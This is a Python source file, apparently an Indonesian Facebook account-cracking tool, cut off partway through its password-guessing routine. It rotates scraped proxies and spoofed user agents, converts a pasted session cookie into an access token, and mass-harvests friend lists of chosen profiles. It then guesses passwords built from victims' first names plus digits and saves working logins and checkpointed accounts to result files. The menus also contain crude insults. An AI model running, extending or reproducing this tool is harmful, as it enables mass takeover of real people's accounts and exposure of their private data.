#/usr/bin/python/#
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from rich.tree import Tree
try:
        import rich
except ImportError:
        print('>> Sedang Menginstall Modul Rich <<')
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        print('>> Sedang Menginstall Modul Stdiomask <<')
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	print('>> Sedang Menginstall Modul Requests & Mechanize <<')
	os.system('pip install requests && pip install mechanize ')

pretty.install()
CON=sol()
ugen2=[]
ugen=[]
adel=[]
cokbrut=[]
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
pwpluss,pwnya=[],[]
ses=requests.Session()
princp=[]
sys.stdout.write('\x1b]2; Christian S. \x07')
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mJaringan Internet Anda Bermasalah')
prox=open('.prox.txt','r').read().splitlines()

###----------[ USER AGENT ]----------###

for agenku in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['10','11','12'])
	c='CPH2421 Build/NBBTRU; wv)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.2261.379'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/357.0.0.49.73;]'
	uakuh=f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}'
	ugen.append(uakuh)

for t in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6.0.1','7.1.1','8.1.0'])
	c='SUPER-ID Build/KOT49H)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36 OPT/1.7.21'
	uakuh=f'{a} {b}; {c} {d}{e}.{f}.{g}.{h} {i}'
	ugen.append(uakuh)

	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','8.1.0','9','10','11'])
	c='MotoG3 Build/MPIS24.107-55-2-17; wv)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.2261.379'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='UCBrowser/12.13.4.1214 Mobile Safari/537.36'
	uakuh=f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}'
	ugen.append(uakuh)

	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','9','10','11','12'])
	c='Redmi Note 9 Pro)'
	d='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/112.0.0.0'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36'
	uakuh=f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}'
	ugen.append(uakuh)

	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','9','10','11','12'])
	c='SM-S901B)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36'
	uakuh=f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}'
	ugen.append(uakuh)

	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['8','9','10','11','12'])
	c='CPH2421 Build/NBBTRU; wv)'
	d='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.2261.379'
	e=random.randrange(83,103)
	f='0'
	g=random.randrange(4200,4900)
	h=random.randrange(40,150)
	i='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/357.0.0.49.73;]'
	uakuh=f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}'
	ugen2.append(uakuh)

def cobaa():
	rc = random.choice
	rr = random.randint
	andro = rc(["9","9.0","8.1.0","7.1.2","6.0.1","10.0.1"])
	merk = str(rr(4, 11))
	build = str(rr(111111, 199999))
	chrome = str(rr(60, 99))+".0."+str(rr(3300, 5900))+"."+str(rr(120, 150))
	edg = str(rr(40, 99))+"0.0."+str(rr(2000, 2999))
	user1 = f"Mozilla/5.0 (Linux; Android {str(rr(4, 9))}.1.0; vivo 1802 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(70, 99))}.0.{str(rr(4500, 4900))}.{str(rr(75, 150))} Mobile Safari/537.36"
	user2 = f"Opera/9.80 (Android; Opera Mini/7.5.{str(rr(35000, 39000))}/{str(rr(190, 199))}.{str(rr(270, 290))}; U; ru) Presto/2.{str(rr(4, 20))}.{str(rr(420, 490))} Version/12.16"
	bct = rc([user1,user2])
	return bct

###ip = requests.get('https://api.ipify.org').text
try:aan = open('ua.txt','r').read().splitlines()
except:aan = ["Mozilla/5.0 (Linux; Android 11; Mi Note 10 Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/416.0.0.35.85;]."]

try:oppo = open('user-agents_oppo.txt','r').read().splitlines()
except:redmii = ["Mozilla/5.0 (Linux; Android 11; Mi Note 10 Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/416.0.0.35.85;]."]

try:operam = open('user-agents_android.txt','r').read().splitlines()
except:operam = ["Mozilla/5.0 (Linux; Android 11; Mi Note 10 Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/416.0.0.35.85;]."]

def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()

sir = '\033[41m\x1b[1;97m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
A = '\x1b[0;33m'
N = '\x1b[0m'    
E = '\033[38;2;255;127;0;1m'
HA = '\x1b[0;32m'
KU = '\x1b[0;33m'
x = '\33[m'
m = '\x1b[1;91m'
k = '\033[93m'
h = '\x1b[1;92m'
hh = '\033[32m'
u = '\033[95m'
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m'
H = ('\x1b[1;90m')
M = ('\x1b[1;91m')
H = ('\x1b[1;92m')
K = ('\x1b[1;93m')
T = ('\x1b[1;94m')
U = ('\x1b[1;95m')
B = ('\x1b[1;96m')
P = ('\x1b[1;97m')
A = "\x1b[38;5;248m"
J = "\x1b[38;5;208m"
Z = "\x1b[0;90m"
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m'
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'


asu = random.choice([M,U,K,A,B,E,H,O,P])
azu = random.choice([M,U,K,A,B,E,O,P])

dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'


class Yowaimo:
	
    def __init__(self):
        self.ses=requests.Session()
        ambil = open('.cok.txt','r').read()
        self.cok = {"cookie": ambil}
       #os.system("clear")
        self.cek()

    def cek(self):
        cp = []
        try:
            xxx = os.listdir("result")
            for z in xxx:
                cp.append(z)
        except:pass
        if len(cp)==0:
            exit("Tidak ada file di dalam folder result silahkan crack terlebih dahulu")
        else:
            xa, xx = {}, 0
            for x in cp:
                try:xz = open(f"result/{x}").readlines()
                except:continue
                xx+=1
                if xx<100:
                    nom = ""+str(xx)
                    xa.update({str(xx):str(x)})
                    xa.update({nom+"0":str(xx)})
                    print(f" ├─[{H}{nom}{P}] {x} Total > [{H}{str(len(xz))}{P}] ")
                else:
                    xa.update({str(xx):str(x)})
                    print(f" ├─[{H}{nom}.{P}]  {x} Total > {str(len(xz))}")
        file = input(" └───➢ \t")
        pemi = input(f" [{H}#{P}] Masukan Pemisah : \t ")
        try:ajg = xa[file]
        except KeyError:
            print("input yang bener")    
        try:
            fi = open(f"result/{ajg}").readlines()
        except FileNotFoundError:
            print("Tidak ada file di dalam folder result silahkan crack terlebih dahulu")
        for yxz in fi:
            user = yxz.replace("\n", "")
            usez = user.split(pemi)
            self.log_hasil(usez[0], usez[1])

    def log_hasil(self, user, pasw):
        try:
            link = self.ses.get(f"https://mbasic.facebook.com/{user}/friends", cookies=self.cok).text
            #exit(link)
            cari = re.findall('<h3 class\=\".*?">(.*?)</h3>', link)
            if "mbasic_logout_button" not in str(link):
                exit(f"\n[{M}!{N}] akun tumbal anda terkena checkpoint, silahkan beralih akun")
            elif "Anda Diblokir Sementar" in str(link):
                exit(f"\n[{M}!{N}] facebook membatasi setiap aktivitas, limit bro, silahkan beralih akun")
            elif "/zero/optin/write" in str(link):
                exit(f"\n[{M}!{N}] akun tumbal anda menggunakan free Facebook, silahkan ubah ke mode data.")
            elif "0" in str(len(cari)):
                print(f"{K} [CP] {user}|{pasw}{N}")
                open("result/CP.txt", "a").write(f"{user}|{pasw}\n")
            else:
                print(f"{H} [OK] {user}|{pasw} {cari[0]}{N}")
                open("result/OK.txt", "a").write(f"{user}|{pasw}\n")
        except Exception as e:exit(e)

def coli(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.04)
def clear():
	os.system('clear')
def back():
	login()

def banner():
	print(f'''{asu}>>[=]<<''')

def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		your_cookies = input(f'{P}└─ Cookie : {asu} ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=867777633323150|446fdcd4a3704f64e5f6e5fd12d35d01&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					print(f"└─Cookie Invalid...", end='\r');time.sleep(3.5);print("                     ", end='\r');exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Sukses!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							print(f"\n{P}└─Token :{asu} {access_token}")
							tokenew = open(".token.txt","w").write(access_token)
							cook= open(".cok.txt","w").write(your_cookies)
							print(f"{P}└─Login Berhasil.... ");exit()
			except Exception as e:
				coli(f"{P}└─Login Gagal.... ")
				os.system('rm -rf .token.txt && rm -rf mcok.txt')
				print(e)
				time.sleep(3)
				back()
	except:pass

def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		requests.post("https://graph.facebook.com/1781113094?fields=subscribers&access_token=%s"%(tokenku))
	except IOError:
		coli(f'└─Cookie Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	
	def logoo():
		print(f'''
	  ⬜⬜⬜⬜⬜⬜⬜🏽🏽🏽🏽⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜
          ⬜⬜⬜⬜⬜⬜🏽⬜⬜⬜⬜🏽🏽🏽🏽⬜⬜⬜⬜⬜⬜⬜⬜⬜
          ⬜⬜⬜⬜⬜🏽⬜⬜⬜⬜⬜⬜⬜⬜🏽🏽🏽🏽⬜⬜⬜⬜⬜⬜
          ⬜⬜⬜⬜⬜🏽⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🏽🏽🏽⬜⬜⬜⬜
          ⬜⬜⬜⬜⬜🏽🏽⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🏽🏽⬜⬜⬜
          ⬜⬜⬜⬜⬜🏽⬛🏽🏽⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🏽🏽⬜⬜
          ⬜⬜⬜⬜⬜⬜🏽⬛⬛🏽⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🏽🏽⬜⬜
          ⬜⬜⬜⬜⬜⬜⬜⬜⬛⬛🏽🏽🏽🏽⬜⬜⬜⬜⬜⬜⬜🏽⬜⬜
          ⬜⬜🟨🟨🟨🟨🟨⬛🏽⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🏽🏽⬜
          🟨🟨🟨🟨🟨🟨🟨🟨🟧⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🏽⬜
          🟨🟧🟨🟨🟨🟨🟨🟨🟨🟧⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜🏽⬜
          🟨🟨🟧🟧🟨🟨🟨🟨🟨🟨🟧⬜🏽🏽⬜⬜⬜⬜⬜⬜⬜⬛⬜⬜
          🟧🟨🟨🟨🟧🟧🟧🟦🟦🟧🟧🟧🟧⬛🏽⬜⬜⬜⬜⬜⬜⬛⬜⬜
          ⬜🟧🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟧⬛🏽⬜⬜⬜⬜⬜⬛⬜⬜
          ⬜⬜🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟧🟧⬛🏽⬜⬜⬜🏽⬛⬜⬜
          ⬜⬜⬛🟦🟦🟦🟦🟦⬛🟦⬛🟦🟦🟧🟧🟧⬛🏽⬜⬜🏽⬛⬜⬜
          ⬜⬛⬛🟦🟦🟦🟦🟦⬛⬛🟦🟦🟧🟨🟨🟨⬛🏽⬜🏽⬛⬜⬜⬜
          ⬜⬜⬛⬛🟦🟦⬛⬛⬜🟦🟦🟦🟧🟨🟨🟨🟧⬛🏽⬛⬛⬜⬜⬜
          ⬜🟦⬜⬛🟦🟦⬛⬛🟦🟦🟦🟦🟧🟨🟨🟨🟨🏽⬛⬛⬜⬜⬜⬜
          ⬜🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟧🟨🟨🟨🟨🟧⬛🟧⬜⬜⬜⬜
          ⬜🟦⬛🟦🟦🟦🟦🟦🟦🟦🟦🟦🟧🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨🟧
          ⬜⬛🟦⬛⬛🟦🟦🟦🟦🟦🟦🟦🟧🟨🟨🟨🟧🟨🟨🟨🟨🟨🟨🟨
          ⬜⬛🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟧🟨🟨🟨🟨🟧🟨🟨🟨🟨🟨🟨
          ⬜⬜⬛🟦🟦🟦🟦🟦🟦🟦🟦🟦🟧🟨🟨🟨🟨🟨🟧🟨🟨🟧🟨🟨
          ⬜⬜⬜⬛⬛🟦🟦🟦🟦🟦🟦🟦🟦🟧🟨🟨🟨🟨🟧🟨🟨🟧🟧🟨
          ⬜⬜⬜🟨🟧⬛⬛⬛⬛⬛⬛🟦⬜🏽🟨🟨🟨🟨🟨🟨🟨🟨🟨🟨
          ⬜⬜⬜🟧🟨🟨🟨🟧🟦🟦🟦⬜⬜⬜🟧🟨🟨🟨🟨🟨🟨🟨🟨🟧
''')
	logoo()
	print(f'                  {P}Developed By : [ {k}Christian S.{P} ]                 \n')
	print(f'{P}─────────────────────────────────────────────────────')
	print(f'\t ┌─[ Hallo Selamat Datang! {T}{my_name}{P} ]\n\t ├───➢ ID Kamu [ {P} {my_id} {P} ]')
	#hariok()
	#haricp()
	###print(f' ├─[ IP : {H} {ip} {P}]')
	print(f'\t ├─[ Total User Agent Saat Ini ]\n\t └───➢  [ {O}'+str(len(aan))+P, '] Biji')
	print(f'{P}─────────────────────────────────────────────────────')
	print(f'{P} ┌─[{H}1{P}] Crack Id Publik')
	print(f'{P} ├─[{H}2{P}] Lihat Hasil Crack')
	print(f'{P} ├─[{H}3{P}] Cek CP 🗿')
	print(f'{P} ├─[{H}0{P}] Hapus Cookie')
	janda = input(f' └───➢ \t')
	
	if janda in ['1']:
		dump_massal()
	elif janda in ['2']:
		#os.system("python grub.py")
		result()
	elif janda in ['3']:
		Yowaimo()
	elif janda in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('[#] Sukses Logout + Hapus Kukis ')
		exit()
	else:
		print('>> Pilih Yang Bener Asu ')
		back()
		
def error():
	print(f'{k}>> Sepertinya Ada Kesalahan Dalam Memilih Fitur')
	time.sleep(4)
	back()
	
def haricp():
	cp = []
	try:
		#xxx = os.listdir("CP")
		xxx = os.listdir(f"CP")
		for z in xxx:
			cp.append(z)
	except:pass
	if len(cp)==0:
		print(f"\t ├─[{M} Belum Ada Hasil {k}CP{M} Hari Ini{P} ]") 
	else:
		xa, xx = {}, 0
		for x in cp:
			try:xz = open(f"CP/{cpc}").readlines()
			except:continue
		xx+=1
		if xx<100:
			nom = ""+str(xx)
			xa.update({str(xx):str(x)})
			xa.update({nom+"0":str(xx)})
			print(f"\t ├─[🪙] {k}{x} {P}[ {k}{str(len(xz))}{P} ] ")
			
def hariok():
	ok = []
	try:
		xxx = os.listdir("OK")
		for z in xxx:
			ok.append(z)
	except:pass
	if len(ok)==0:
		#os.system("touch {okc}")
		print(f"\t ├─[{M} Belum Ada Hasil {H}OK{M} Hari Ini{P} ]") 
	else:
		xa, xx = {}, 0
		for x in ok:
			try:zx = open(f"OK/{okc}").readlines()
			except:continue
		xx+=1
		if xx<100:
			nom = ""+str(xx)
			xa.update({str(xx):str(x)})
			xa.update({nom+"0":str(xx)})
			print(f"\t ├─[💸] {H}{x} {P}[ {H}{str(len(zx))}{P} ] ") 

def result():
	print(f'{P}─────────────────────────────────────────────────────')
	print(f'┌─[{H}1{P}] Hasil {h}OK{P} Anda ')
	print(f'├─[{K}2{P}] Hasil {k}CP{P} Anda ')
	print(f'├─[{M}3{P}] Kembali	')
	kz = input(f'└───➢ ')
	print(f'{P}─────────────────────────────────────────────────────')
	if kz in ['2']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					
					print(f'{P}├─[{K}%s{P}] Hasil %s ({k} %s {P}Akun )'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
					print(f'{P}─────────────────────────────────────────────────────')
			geeh = input(f'└───➢ ')
			print(f'{P}─────────────────────────────────────────────────────')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{P}├─[{K}#{P}] {k}{cpkuni[0]}{P}│{k}{cpkuni[1]}')
				nocp +=1
			print(f'{P}─────────────────────────────────────────────────────')
			input(f'{P}[{m} Klik Enter{P} ]')
			back()
	elif kz in ['1']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<50:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'{P}├─[{H}%s{P}] Hasil %s ({h}%s{P} Akun)'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'{P}├─[{H}%s{P}] Hasil %s ({h}%s {P}Akun)'%(cih,isi,(len(hem))))
			geeh = input(f'└────➢ ')
			print(f'{P}─────────────────────────────────────────────────────')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				#print(f'{x}>> {h}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}')
				print(f'{P}├─[{H}#{P}] {h}{cpkuni[0]}{P}│{h}{cpkuni[1]}\n{P}├─[{H}#{P}] {h}{cpkuni[2]}')
				nocp +=1
			print(f'{P}─────────────────────────────────────────────────────')
			input(f'{P}[{m}Klik Enter{P}]')
			back()
	elif kz in ['3']:
		back()
	else:
		print('>> Pilih Yang Bener Kontol ')
		back()

def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		print(f'{P}─────────────────────────────────────────────────────')
		jum = int(input(f'{P} ┌─[{H}•{P}] Mau Berapa Id ? : '))
	except ValueError:
		print('>> Masukkan Angka Anjing, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print('>> Gagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		###kl = input(f'{P}├─['+str(yz)+'] Enter the Id : ')
		kl = input(f' ├─[{H}•{P}] Masukan Id Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('>> Sinyal Loh Kek Kontoll ')
			exit()
	try:
		coli(f' └───➢ Id Terkumpul : {H} '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print('>> Sinyal Lo kek Kontol ')
		back()
	except (KeyError,IOError):
		print(f'>>{k} Pertemanan Tidak Public {x}')
		time.sleep(3)
		back()

def setting():
	print(f'{P}─────────────────────────────────────────────────────')
	print(f'{P}┌─[{H}1{P}] Crack Dari Id Acak ')
	print(f'├─[{H}2{P}] Crack Dari Id Termuda ')
	hu = input('└───➢ ')
	if hu in ['1','01']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	else:
		print('>> Pilih Yang Bener Kontooll ')
		exit()
	print(f'{P}─────────────────────────────────────────────────────')
	print(f'{P}┌─[{H}1{P}] Validate')
	print(f'{P}├─[{H}2{P}] Async')
	print(f'{P}├─[{H}3{P}] Beta Version  [{k} New {P}] ')
	print(f'{P}├─[{H}4{P}] Mbasic ')
	hc = input('└───➢ ')
	if hc in ['1','01']:
		method.append('satu')
	elif hc in ['']:
		print('>> Pilih Yang Bener Kontol ')
		setting()
	elif hc in ['2','02']:
		method.append('dua')
	elif hc in ['3','03']:
		method.append('tiga')
	elif hc in ['4','04']:
		method.append('empat')
	else:
		method.append('satu')

	print(f'{P}─────────────────────────────────────────────────────')
	pwplus=input(f'{P}┌─[{H}•{P}] Tambahkan Password Manual ( y/t ) : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f"{P}├─[{H}•{P}] Contoh : yusuf,ngentod,anggun")
		pwku=input(f'{P}└───➢  ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()

def passwrd():
	print(f'{P}─────────────────────────────────────────────────────')
	print(f'┌─{P}[{H}#{P}] Hasil {h}OK{P} Tersimpan Di : {h}OK/%s {P}'%(okc))
	print(f'└─{P}[{k}#{P}] Hasil {k}CP{P} Tersimpan Di : {k}CP/%s {P}'%(cpc))
	print(f'{P}─────────────────────────────────────────────────────')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'321')
			else:
				if len(frs)<3: 
					pwv.append(nmf)
				else:
